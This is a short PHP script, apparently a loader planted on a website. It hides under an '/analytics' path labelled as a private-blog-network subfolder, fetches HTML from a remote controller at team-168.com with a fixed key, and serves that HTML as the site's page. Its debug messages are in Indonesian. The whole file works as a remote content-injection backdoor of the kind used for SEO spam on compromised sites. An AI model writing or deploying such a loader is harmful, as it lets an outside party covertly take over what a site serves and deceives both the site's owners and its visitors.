    <?php
    $domain_base  = $_SERVER["HTTP_HOST"] ?? ""; 
    $unique_key   = "71650f3a32e7ef1363e7a7c8a9b62519"; 
    $raw_uri      = $_SERVER["REQUEST_URI"] ?? "/"; 
    $path         = parse_url($raw_uri, PHP_URL_PATH) ?? "/";
    $pbn_subfolder = "/analytics"; 
    $host_only = preg_replace("/^www\./i", "", $domain_base);

    if (strpos($path, $pbn_subfolder) === 0) {
        $domain_key = $host_only . '/' . trim($pbn_subfolder, '/');
    } else {
        $domain_key = $host_only;
    }
    $trimmed_path = str_replace($pbn_subfolder, '/', $path);
    $is_home      = $trimmed_path === "/" || $trimmed_path === "/index.php";
    $current_slug = $is_home ? "" : trim($trimmed_path, "/");
    $api_url  = "https://team-168.com/controller/loader.php" .
                "?domain=" . urlencode($domain_key) . 
                "&key=" . urlencode($unique_key) .
                "&load=HTML" .
                "&slug=" . urlencode($current_slug);

    $response = @file_get_contents($api_url); 

    if ($response !== false && $response !== "") { 
        echo $response;
        exit();
    } else {
        header("Content-Type: text/html; charset=UTF-8");
        echo "<h1>DEBUG API FAILED! (Format Domain Key Salah)</h1>";
        echo "<p><strong>Domain Key (dikirim):</strong> <code>" . htmlspecialchars($domain_key) . "</code> (HARUS ada slash di tengah)</p>";
        echo "<p><strong>Current Slug (dikirim):</strong> <code>" . htmlspecialchars($current_slug) . "</code></p>";
        echo "<p><strong>API URL:</strong> <a href='" . htmlspecialchars($api_url) . "' target='_blank'>" . htmlspecialchars($api_url) . "</a> (Coba buka di browser)</p>";
        if ($response === false) {
            $error = error_get_last();
            echo "<p style='color:red; font-weight:bold;'>❌ file_get_contents GAGAL (Kemungkinan 404 atau Error Jaringan): " . htmlspecialchars($error['message'] ?? 'Unknown error') . "</p>";
        } else {
            echo "<p style='color:red; font-weight:bold;'>⚠️ API Sukses dihubungi, TAPI mengembalikan RESPON KOSONG atau error 500.</p>";
        }
        echo "<hr><h1>Website aktif</h1><p>Konten tidak ditemukan atau API sedang down.</p>";
        exit();
    }
    ?>
